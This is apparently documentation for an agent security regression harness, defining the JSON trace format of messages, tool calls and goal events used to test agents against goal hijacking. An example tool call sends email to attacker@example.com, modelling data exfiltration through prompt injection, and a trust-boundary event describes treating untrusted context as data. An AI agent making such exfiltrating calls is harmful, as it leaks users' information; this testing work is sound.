# Trace Format

The Agent Security Regression Harness evaluates agent behavior through execution traces.

A trace is a JSON-compatible object that records what happened during a scenario run. The harness does not require a specific agent framework. Instead, live targets and adapters must return trace-shaped JSON that the assertion engine can evaluate.

## Top-level shape

A trace contains three top-level lists:

```json
{
  "messages": [],
  "tool_calls": [],
  "events": []
}
```

All three fields are required by convention and should be present even when empty.

## Messages

`messages` records conversation-like activity.

Example:

```json
{
  "messages": [
    {
      "role": "user",
      "content": "Summarize the document."
    },
    {
      "role": "assistant",
      "content": "Here is the summary."
    }
  ]
}
```

Message fields:

| Field | Type | Description |
|---|---:|---|
| `role` | string | Message role, such as `user`, `assistant`, `system`, or `tool`. |
| `content` | string | Message text. |

Assertions may inspect messages for secret disclosure, goal drift, or other policy violations.

## Tool calls

`tool_calls` records tools the agent attempted to call.

Example:

```json
{
  "tool_calls": [
    {
      "name": "send_email",
      "arguments": {
        "to": "attacker@example.com",
        "subject": "Requested information"
      }
    }
  ]
}
```

Tool call fields:

| Field | Type | Description |
|---|---:|---|
| `name` | string | Preferred tool name field. |
| `tool` | string | Alternative tool name field accepted by the harness. |
| `tool_name` | string | Alternative tool name field accepted by the harness. |
| `arguments` | object | Tool arguments supplied by the agent. |

The harness currently recognizes tool names from these fields, in order:

1. `name`
2. `tool`
3. `tool_name`

A tool call should use `name` unless an adapter is translating from a framework that already uses a different field.

## Events

`events` records structured runtime facts that are not plain messages or tool calls.

Example:

```json
{
  "events": [
    {
      "type": "goal",
      "id": "summarize_document"
    }
  ]
}
```

Event fields:

| Field | Type | Description |
|---|---:|---|
| `type` | string | Event category. |
| `id` | string | Stable identifier for the event. |

Additional event fields may be included when useful for evidence, debugging, or future assertions.

## Goal events

Goal events describe the goal the agent actually followed during execution.

Goal event shape:

```json
{
  "type": "goal",
  "id": "summarize_document"
}
```

The `id` should be a stable, snake_case identifier.

Example expected goal in a scenario:

```yaml
assertions:
  - type: goal_integrity
    expected_goal: summarize_document
```

Example passing trace event:

```json
{
  "type": "goal",
  "id": "summarize_document"
}
```

Example failing trace event:

```json
{
  "type": "goal",
  "id": "send_email"
}
```

Goal matching should use strict equality. Substring matching should not be used for security assertions because it can create false positives.

## Trust-boundary events

Targets may record when untrusted context was observed and treated as data.

Example:

```json
{
  "type": "untrusted_context_received",
  "policy": "treated as data, not instruction"
}
```

This is useful evidence for hardened agents that preserve the user's goal while refusing to follow injected instructions.

## Example complete trace

```json
{
  "messages": [
    {
      "role": "user",
      "content": "Summarize the document."
    },
    {
      "role": "assistant",
      "content": "Here is the summary."
    }
  ],
  "tool_calls": [],
  "events": [
    {
      "type": "goal",
      "id": "summarize_document"
    },
    {
      "type": "untrusted_context_received",
      "policy": "treated as data, not instruction"
    }
  ]
}
```

## Adapter responsibility

Adapters and live HTTP targets are responsible for converting framework-specific behavior into this trace format.

For live HTTP targets, the target receives scenario input and returns trace JSON.

Request body:

```json
{
  "scenario_id": "goal_hijack.outbound_email_exfiltration_001",
  "input": {
    "user_message": "Summarize the document.",
    "context": []
  }
}
```

Response body:

```json
{
  "messages": [],
  "tool_calls": [],
  "events": []
}
```

The assertion engine evaluates only the returned trace and the scenario policy.